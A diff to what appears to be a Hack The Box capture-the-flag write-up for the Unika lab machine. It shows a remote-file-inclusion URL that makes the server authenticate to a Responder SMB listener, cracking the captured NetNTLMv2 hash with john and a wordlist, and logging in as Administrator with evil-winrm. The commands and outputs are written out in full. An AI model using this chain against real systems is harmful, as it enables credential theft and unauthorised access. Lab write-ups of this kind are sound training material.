@@ -327,10 +327,56 @@ rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localh
 name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
 ```
 
-Now that we know we can access files on the server, an `LFI` (Local File Incluse) vulnerability, perhaps we there is an `RFI` (Remote File Incluse) vulnerability. 
+Now that we know we can access files on the server, an `LFI` (Local File Incluse) vulnerability, perhaps we there is an `RFI` (Remote File Incluse) vulnerability. From our `nmap`, we know that the server hosting this page is a `Windows` machine. So, in order for us to test this RFI vulnerability, we will first need to learn a bit about `NTLM`.
+
+### NTLM
+`NTLM` (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Noteably, it is a `single sign-on` (SSO) which allows requires users to only be authenticated once. More details of `NTLM` and the authentication process can be found on [Crowdstrike](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/). Basically, there are tools - such as `Responder` - which allow us to listen in on the NTLM authentication and capture the `NetNTLMv2` hash. If we are able to crack this hash, we can then gain access to the server. Let's give it a go.
+
+### Responder
+`Responder` (`git clone https://github.com/lgandx/Responder`), is a tool that can simulate many attacks. In this case, we will use it as a malicious SMB server to capture the `NetNTLMv2` hash. This can be done by:
+
+`sudo python3 Responder.py -I tun0`
+
+Now we will have the server interact with this SMB server (hosted on your client IP - mine being `10.10.14.165`) by changing the URL in our browser to:
+
+`http://unika.htb/index.php?page=//10.10.14.165/any_file_name`
+
+Hash acquired!
 
 ![resp.py](/img/tier1/resp.py.png)
 
+We just need to crack it.
+
+### john the ripper
+`john` (john the ripper) is one commonly used hash cracking tools. Let's copy this hash from `Responder` and throw it into a text file such as `hashed.txt`. Let `john` do the rest:
+
+`john -w=/usr/share/wordlists/rockyou.txt hashed.txt`
+
+```
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+badminton        (Administrator)     
+1g 0:00:00:00 DONE (2022-10-25 23:58) 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+There we go... `Administrator:badminton`. Time to exploit.
+
+### WinRM
+`winrm` (Windows Remote Management) is a protocol that allows devices to access a system remotely. `evil-winrm` is a tool that allows us to connect to a windows machine and still be able to use `Powershell` on `Linux`. 
+
+`evil-winrm -i 10.129.245.210 -u Administrator -p badminton`
+
+We are in. Now we can run a PowerShell command to look for the flag so we don't have to!
+
+`Get-ChildItem -Path C:\ -Filter flag.txt -Recurse`
+
+Box popped. 
+
+![responder](/img/tier1/responder.png)
 
 ### Questions
 - When visiting the web service using the IP address, what is the domain that we are being redirected to? `unika.htb`
